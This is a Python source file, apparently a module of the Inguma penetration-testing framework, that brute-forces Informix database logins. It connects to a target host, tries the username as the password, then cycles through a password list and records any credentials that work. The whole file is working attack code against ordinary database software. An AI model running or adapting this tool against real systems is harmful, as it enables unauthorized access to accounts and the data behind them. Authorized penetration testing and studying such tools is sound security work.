#!/usr/bin/python

"""
Informix Brute Force Module for Inguma

Copyright (c) 2006, 2007, 2008 Joxean Koret, joxeankoret [at] yahoo.es

This program is free software; you can redistribute it and/or
modify it under the terms of the GNU General Public License
as published by the Free Software Foundation; version 2
of the License.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
"""

import sys
import time
import socket
import threading

from lib.module import CIngumaModule

from lib.core import int2hex
from lib.libinformix import *

VERSION = "0.1.1"

name = "bruteifx"
brief_description = "Brute force tool for Informix"
type = "brute"

class CInformixBrute(CIngumaModule):
    host = ""
    port = 5000
    user = "sa"
    dict = {}
    timeout = 5

    def __init__(self):
        pass

    def help(self):
        print "target = <target host or network>"
        print "port = <port>"
        print "user = <username>"

    def login(self, user, passwd):
        ifx = Informix()
        socket.setdefaulttimeout(self.timeout)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.target, int(self.port)))
        if ifx.login(s, user, passwd):
            return True
        else:
            raise Exception("Invalid username or password")

    def doBruteForce(self):
        userList = [self.user, ]

        try:
            self.gom.echo("Trying " + self.user + "/" + self.user)
            x = self.login(self.user, self.user)
            self.addToDict(self.target + "_passwords", self.user + "/" + self.user)
            self.results[self.user] = self.user
            return True
        except:
            # Well, first try :)
            pass

        for user in userList:
            for passwd in self.getPasswordList():
                time.sleep(self.waitTime)
                try:
                    passwd = passwd.replace("\n", "").replace("\r", "")
                    self.gom.echo("Trying " + user + "/" + passwd + "...")
                    self.login(user, passwd)
                    sys.stdout.write("\b"  * 80)
                    self.addToDict(self.target + "_passwords", self.user + "/" + passwd)
                    self.results[user] = passwd

                    return True
                except KeyboardInterrupt:
                    self.gom.echo( "Aborted." )
                    return False
                except:
                    pass

        return True

    def run(self):
        if self.user == "":
            self.gom.echo( "No user specified" )
            return False

        self.doBruteForce()

        return False
